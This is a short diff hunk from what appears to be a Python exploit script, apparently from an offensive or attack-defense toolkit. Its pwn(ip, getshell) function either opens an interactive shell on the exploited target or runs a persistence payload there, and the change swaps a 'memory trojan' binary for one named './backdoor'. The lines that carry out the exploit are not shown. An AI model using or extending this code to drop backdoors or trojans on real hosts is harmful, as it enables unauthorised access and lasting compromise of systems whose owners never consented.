@@ -129,7 +129,7 @@ def pwn(ip, getshell = True):
     if getshell:
         p.interactive()
     else:
-        run(p, "./LinuxCMemoryTorjan/main")
+        run(p, "./backdoor")
 
 if __name__ == '__main__':
     pwn('127.0.0.1', getshell = False)
